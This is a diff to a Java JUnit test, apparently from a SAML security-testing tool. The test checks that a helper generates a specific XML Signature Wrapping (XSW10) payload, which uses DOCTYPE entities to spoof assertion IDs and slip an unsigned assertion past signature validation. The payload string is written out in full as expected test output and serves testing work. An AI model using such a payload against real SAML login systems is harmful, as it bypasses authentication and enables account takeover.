@@ -1,14 +1,14 @@
 package helpers;
 
+import org.junit.jupiter.api.Test;
 import org.w3c.dom.Document;
-import org.xml.sax.SAXException;
-
-import java.io.IOException;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 
 public class Xsw10Test {
-    public static void main(String[] args) throws SAXException, IOException {
+
+    @Test
+    void testXSW10() throws Exception {
         String originalAssertion =
                 "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                         "<Response ID=\"_original_response_ID\">" +
@@ -22,11 +22,13 @@ public class Xsw10Test {
                         "<NameID>OriginalName</NameID>" +
                         "</Assertion>" +
                         "</Response>";
+
         String exploitAssertion = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE response [\n" +
                 "<!ENTITY idViaEntity \"_original_assertion_ID\">\n" +
                 "<!ENTITY BypassIDUniqueness \"&#x50;\">\n" +
                 "]>\n" +
                 "<Response ID=\"&idViaEntity;\"><Issuer>SomeIssuer</Issuer><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo><Object xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><Assertion ID=\"&BypassIDUniqueness;_original_assertion_ID\"><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo></Signature><NameID>OriginalName</NameID></Assertion></Object></Signature><Assertion ID=\"_original_assertion_IDffff\"><NameID>OriginalName</NameID></Assertion></Response>";
+
         XMLHelpers xmlHelpers = new XMLHelpers();
         XSWHelpers xswHelpers = new XSWHelpers();
 
@@ -35,6 +37,5 @@ public class Xsw10Test {
         String after = xmlHelpers.getString(document);
         String exploit = xswHelpers.applyDOCTYPE(after);
         assertEquals(exploitAssertion, exploit);
-
     }
 }
